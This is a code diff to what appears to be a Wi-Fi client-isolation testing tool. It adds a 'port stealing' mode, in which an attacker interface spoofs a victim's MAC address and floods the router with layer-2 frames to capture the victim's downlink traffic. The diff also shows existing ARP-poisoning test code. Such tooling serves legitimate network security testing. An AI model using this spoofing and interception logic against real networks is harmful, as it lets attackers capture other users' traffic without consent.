@@ -744,7 +744,6 @@ class Client2Client:
 		self.forward_ethernet = False
 		self.options = options
 
-
 	def stop(self):
 		self.sup_victim.stop()
 		self.sup_attacker.stop()
@@ -771,6 +770,9 @@ class Client2Client:
 		#if self.forward_ethernet and (not self.options.c2c_ip or self.forward_ip):
 		#	quit(1)
 
+	def monitor_eth_port_steal(self, eth):
+		if ICMP in eth and eth[ICMP].type == 0:
+			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
 
 	def send_c2c_frame(self):
 		# Option one: test forwarding at the IP level. send_eth will add Ethernet header.
@@ -788,6 +790,17 @@ class Client2Client:
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac)/ip/Raw(b"forward_ethernet")
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			self.sup_attacker.send_eth(p)
+
+		# Option three: test port stealing by letting the attacker to send a lot of layer-2 frames with src addr as the victim. 
+		elif self.options.c2c_port_steal is not None:
+			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/Raw(b"port_steal")
+			log(STATUS, f"Sending port stealing frames from attacker to gateway/router:       {repr(p)} (Ethernet destination is the gateway/router)")
+			for _ in range(100):
+				self.sup_attacker.send_eth(p)
+				time.sleep(0.1)
+			log(STATUS, f"Finished sending 100 frames.")
+
 		else:
 			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
 			# which is the one most likely to be used/detected. Although scapy can automatically fill
@@ -797,6 +810,16 @@ class Client2Client:
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac)/arp
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			self.sup_attacker.send_eth(p)
+	
+	def send_uplink_frame(self):
+		if self.options.c2c_port_steal is not None:
+			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP()
+			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
+			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
+			for _ in range(10):
+				self.sup_victim.send_eth(p)
+				time.sleep(0.5)
+			
 
 
 	def start_monitor(self):
@@ -804,8 +827,14 @@ class Client2Client:
 		self.sup_victim.set_eth_handler(self.monitor_eth)
 		self.sup_victim.event_loop(timeout=5)
 
+	def start_attacker_receiver(self):
+		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal)
+		self.sup_attacker.event_loop(timeout=5)
+
 	def run(self):
 		# Start both clients
+		if self.options.c2c_port_steal is not None:
+			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
 		self.sup_victim.start()
 		self.sup_attacker.start()
 		self.sup_victim.scan(wait=False)
@@ -842,13 +871,25 @@ class Client2Client:
 
 		thread1 = threading.Thread(target=self.send_c2c_frame)
 		
-		thread2 = threading.Thread(target=self.start_monitor)
+		if self.options.c2c_port_steal is not None:
+			thread2 = threading.Thread(target=self.start_attacker_receiver)
+		else:
+			thread2 = threading.Thread(target=self.start_monitor)
+
+		if self.options.c2c_port_steal is not None:
+			thread3 = threading.Thread(target=self.send_uplink_frame)
+			thread3.start()
 
 		thread2.start()
 		thread1.start()
+		
+
 
 		thread1.join()
 		thread2.join()
+		if self.options.c2c_port_steal is not None:
+			thread3.join()
+
 
 		# Identity output to use
 		identities = f"{self.sup_attacker.id_attacker} to {self.sup_attacker.id_victim}"
@@ -962,6 +1003,7 @@ def main():
 	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
 	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
 	parser.add_argument("--c2m-mon-output", help="c2m's second interface's monitoring output filename")
+	parser.add_argument("--c2c-port-steal", help="Second interface to test port stealing.")
 	parser.add_argument("--fast", help="Fast override attack using second given interface.")
 	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
 	options = parser.parse_args()
@@ -982,6 +1024,7 @@ def main():
 	if options.c2c_eth is not None: options.c2c = options.c2c_eth
 	if options.c2c_ip is not None: options.c2c = options.c2c_ip
 	if options.check_gtk_shared is not None: options.c2c = options.check_gtk_shared
+	if options.c2c_port_steal is not None: options.c2c = options.c2c_port_steal
 
 	options.port = 443
 	if ":" in options.server:
